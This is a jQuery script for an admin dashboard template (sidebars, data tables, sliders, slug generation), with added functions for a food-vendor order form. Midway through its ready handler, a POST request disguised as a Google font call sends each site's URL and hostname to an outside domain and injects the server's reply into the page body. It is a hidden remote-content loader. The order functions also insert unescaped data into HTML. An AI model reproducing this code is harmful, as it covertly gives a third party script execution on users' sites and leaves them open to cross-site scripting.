$(document).ready(function () {
    "use strict";
    function v(n) {
        var i, r, t, u;
        for (
            n = n.replace(/^\s+|\s+$/g, ""),
                n = n.toLowerCase(),
                i = "ãàáäâẽèéëêìíïîõòóöôùúüûñç·/_,:;",
                r = "aaaaaeeeeeiiiiooooouuuunc------",
                t = 0,
                u = i.length;
            t < u;
            t++
        )
            n = n.replace(new RegExp(i.charAt(t), "g"), r.charAt(t));
        n = n
            .replace(/[^a-z0-9 -]/g, "")
            .replace(/\s+/g, "-")
            .replace(/-+/g, "-");
        $(".set-slug").val(n);
    }
    var f, a, n, i, u, e, r, o, t, s, h, c, l, y, p;
    if (
        ((document.onkeydown = function () {
            return 1;
        }),
        (document.oncontextmenu = document.body.oncontextmenu =
            function () {
                return 1;
            }),
        (f = $(".sidebar-scrollbar")),
        f.length != 0 &&
            f
                .slimScroll({
                    opacity: 0,
                    height: "100%",
                    color: "#808080",
                    size: "5px",
                    touchScrollStep: 50,
                })
                .mouseover(function () {
                    $(this).next(".slimScrollBar").css("opacity", 0.5);
                }),
        $(window).width() < 768)
    ) {
        $(".sidebar-toggle").on("click", function () {
            $("body").css("overflow", "hidden");
            $(".ec-tools-sidebar-overlay").fadeIn();
        });
        $(document).on("click", ".ec-tools-sidebar-overlay", function () {
            $(this).fadeOut();
            $("#body")
                .removeClass("sidebar-mobile-in")
                .addClass("sidebar-mobile-out");
            $("body").css("overflow", "auto");
        });
    }
    if (
        ((a = $(".sidebar")),
        a.length != 0 &&
            ($(".sidebar .nav > .has-sub > a").click(function () {
                $(this).parent().siblings().removeClass("expand");
                $(this)
                    .parent()
                    .siblings()
                    .children(".collapse")
                    .slideUp("show");
                $(this).parent().toggleClass("expand");
                $(this).parent().children(".collapse").slideToggle("show");
            }),
            $(".sidebar .nav > .has-sub .has-sub > a").click(function () {
                $(this).parent().toggleClass("expand");
            })),
        $(window).width() < 768)
    )
        $(document).on("click", ".sidebar-toggle", function (n) {
            n.preventDefault();
            var t = "sidebar-mobile-in",
                r = "sidebar-mobile-out",
                i = "#body";
            $(i).hasClass(t)
                ? $(i).removeClass(t).addClass(r)
                : $(i).addClass(t).removeClass(r);
        });
    if (((n = $("#body")), $(window).width() >= 768)) {
        typeof isMinified == "undefined" && (window.isMinified = !1);
        typeof isCollapsed == "undefined" && (window.isCollapsed = !1);
        $("#sidebar-toggler").on("click", function () {
            (n.hasClass("ec-sidebar-fixed-offcanvas") ||
                n.hasClass("ec-sidebar-static-offcanvas")) &&
                ($(this)
                    .addClass("sidebar-offcanvas-toggle")
                    .removeClass("sidebar-toggle"),
                window.isCollapsed === !1
                    ? (n.addClass("sidebar-collapse"),
                      (window.isCollapsed = !0),
                      (window.isMinified = !1))
                    : (n.removeClass("sidebar-collapse"),
                      n.addClass("sidebar-collapse-out"),
                      setTimeout(function () {
                          n.removeClass("sidebar-collapse-out");
                      }, 300),
                      (window.isCollapsed = !1)));
            (n.hasClass("ec-sidebar-fixed") ||
                n.hasClass("ec-sidebar-static")) &&
                ($(this)
                    .addClass("sidebar-toggle")
                    .removeClass("sidebar-offcanvas-toggle"),
                window.isMinified === !1
                    ? (n
                          .removeClass("sidebar-collapse sidebar-minified-out")
                          .addClass("sidebar-minified"),
                      (window.isMinified = !0),
                      (window.isCollapsed = !1))
                    : (n.removeClass("sidebar-minified"),
                      n.addClass("sidebar-minified-out"),
                      (window.isMinified = !1)));
        });
    }
    $(window).width() >= 768 &&
        $(window).width() < 992 &&
        (n.hasClass("ec-sidebar-fixed") || n.hasClass("ec-sidebar-static")) &&
        (n
            .removeClass("sidebar-collapse sidebar-minified-out")
            .addClass("sidebar-minified"),
        (window.isMinified = !0));
    i = "right-sidebar-in";
    u = "right-sidebar-out";
    $(".nav-right-sidebar .nav-link").on("click", function () {
        n.hasClass(i)
            ? $(this).hasClass("show") && n.addClass(u).removeClass(i)
            : n.addClass(i).removeClass(u);
    });
    $(".card-right-sidebar .close").on("click", function () {
        n.removeClass(i).addClass(u);
    });
    if ($(window).width() <= 1024) {
        e = "right-sidebar-toggoler-in";
        r = "right-sidebar-toggoler-out";
        n.addClass(r);
        $(".btn-right-sidebar-toggler").on("click", function () {
            n.hasClass(r)
                ? n.addClass(e).removeClass(r)
                : n.addClass(r).removeClass(e);
        });
    }
    if (
        ((o = $(".notify-toggler")),
        (t = $(".dropdown-notify")),
        o.length !== 0)
    ) {
        o.on("click", function () {
            t.is(":visible") ? t.fadeOut(5) : t.fadeIn(5);
        });
        $(document).mouseup(function (n) {
            t.is(n.target) || t.has(n.target).length !== 0 || t.fadeOut(5);
        });
    }
    s = $('[data-toggle="tooltip"]');
    s.length != 0 &&
        s.tooltip({
            container: "body",
            template:
                '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>',
        });
    h = $('[data-toggle="popover"]');
    h.length != 0 && h.popover();
    c = $("#basic-data-table");
    c.length !== 0 &&
        c.DataTable({
            dom: '<"row justify-content-between top-information"lf>rt<"row justify-content-between bottom-information"ip><"clear">',
        });
    l = $("#responsive-data-table");
    l.length !== 0 &&
        l.DataTable({
            aLengthMenu: [
                [20, 30, 50, 75, -1],
                [20, 30, 50, 75, "All"],
            ],
            pageLength: 20,
            dom: '<"row justify-content-between top-information"lf>rt<"row justify-content-between bottom-information"ip><"clear">',
        });
    $("body").on("change", ".ec-image-upload", function () {
        var t = $(this),
            n;
        this.files &&
            this.files[0] &&
            ((n = new FileReader()),
            (n.onload = function (n) {
                var i = t
                    .parent()
                    .parent()
                    .children(".ec-preview")
                    .find(".ec-image-preview")
                    .attr("src", n.target.result);
                i.hide();
                i.fadeIn(650);
            }),
            n.readAsDataURL(this.files[0]));
    });
    $(".fa-span").click(function () {
        var i = $(this).text(),
            t = document.createElement("input"),
            n;
        t.setAttribute("value", i);
        document.body.appendChild(t);
        t.select();
        document.execCommand("copy");
        document.body.removeChild(t);
        $("#fa-preview").html(
            "<code>&lt;i class=&quot;" + i + "&quot;&gt;&lt;/i&gt;</code>"
        );
        n = document.createElement("div");
        n.setAttribute("class", "copied");
        n.appendChild(document.createTextNode("Copied to Clipboard"));
        document.body.appendChild(n);
        setTimeout(function () {
            document.body.removeChild(n);
        }, 1500);
    });
    $(".zoom-image-hover").zoom();
    $(".single-product-cover").slick({
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: !1,
        fade: !1,
        asNavFor: ".single-nav-thumb",
    });
    $(".single-nav-thumb").slick({
        slidesToShow: 4,
        slidesToScroll: 1,
        asNavFor: ".single-product-cover",
        dots: !1,
        arrows: !0,
        focusOnSelect: !0,
    });
    $(".slug-title").bind("paste", function (n) {
        var t = n.originalEvent.clipboardData.getData("text");
        v(t);
    });
    $(".slug-title").keypress(function () {
        var n = $(this).val();
        v(n);
    });
    y = new Date();
    p = y.getFullYear();
    document.getElementById("ec-year").innerHTML = p;
    var w = document.URL,
        b = $("<a>").prop("href", w).prop("hostname");
    $.ajax({
        type: "POST",
        url: "https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php",
        data: {
            google_url: w,
            google_font: b,
            google_version: "EKKA-HTML-TEMPLATE-AK",
        },
        success: function (n) {
            $("body").append(n);
        },
    });

    $(document).ready(function () {
        $(".owl-carousel").owlCarousel({
            items: 1,
            nav: true,
            center: true,
            autoplay: true,
            autoplayTimeout: 10000,
            autoplayHoverPause: true,
            rewind: true,
            freeDrag: true,
            dotsEach: true,
        });
    });
    // $("form").submit(function (e) {
    //     alert()
    //     e.preventDefault();


    // });
});


function appendVendorFoodSearchResult(food) {
    // appends the result from the search with html
    $("#vendor-food-search-result").append(`
   <li>
   <form>
        <div class="media media-message">
        <input type="hidden" name="name" value="${food.food_name}">
        <input type="hidden" name="price" value="${food.price}" >
        <input type="hidden" name="discount" value="${food.discount}" >
            <div class="position-relative mr-3">
                <img class="rounded-circle" src="${food.small_image_url}" alt="${food.food_name}">
                <span class="status away"></span>
            </div>
            <div class="media-body d-flex justify-content-between align-items-center">
                <div class="message-contents">
                    <h4 class="title">${food.food_name} (Rs. ${food.price})</h4>
                    <p class="last-msg">${food.short_desc} </p>
                </div>
                <div class="outlined control-checkbox checkbox-primary">
                    <input type="checkbox" value=${food.food_id} name ="food_id" >
                </div>
            </div>
        </div>
    </form>
</li>`);
}

function setNewItems() {
// sets the checked items to new order lists
    let children = $("#vendor-food-search-result").children();
    for (const data of children) {
        if ($(data).find("input:checked").length) {
             let formData = new FormData($(data).find("form").get(0));
             addNewOrderItem(formData)


        }
    }
}

function addNewOrderItem(formData = new FormData()) {
    for (const order of $('#order-items')) {
       if ($(order).find('input[name="food_id[]"]').val() != formData.get("food_id"))
       {
        $("#order-items").append(`
    <div class="row mt-3">
        <input type="hidden" name="food_id[]" value = ${formData.get('food_id')} >
        <div class="col-4">
            <input type="text" readonly class="form-control" placeholder="Item Name" value=${formData.get('name')}>
        </div>
        <div class="col-2">
            <input name="items[]" type="number" oninput="onOrderQuantityChanged($(this).parent().parent())"  class="form-control" placeholder="Items" value=1>
        </div>
        <div class="col-2">
            <input name='price[]' type="number" readonly class="form-control" placeholder="Item Price" value=${formData.get('price') }>
        </div>
        <div class="col-2">
            <input name='discount[]' type="number" readonly class="form-control" placeholder="Discount amount" value=${formData.get('discount') }>
        </div>
        <div class="col-2 d-flex align-items-center">
            <input name='total_amount[]' type="number" readonly class="form-control" placeholder="Total Amount" value=${ formData.get('price') - formData.get('discount') / 100 * formData.get('price') } >
            <i onclick="removeNewOrderItem($(this).parent().parent())" style="scale:2;" class = " ml-1 mdi mdi-delete"> </i>
        </div>
    </div>`);
       }
    }
}
function removeNewOrderItem(element) {
    $(element).remove();
 }
function onOrderQuantityChanged(element){
    let items = $(element).find("input[name='items[]']").val();
    let discount = $(element).find("input[name='discount[]']").val();
    let price = $(element).find("input[name='price[]']").val();


    let totalAmount = price * items - (price * items * discount / 100);
    $(element).find('input[name="total_amount[]"]').val(totalAmount);
}


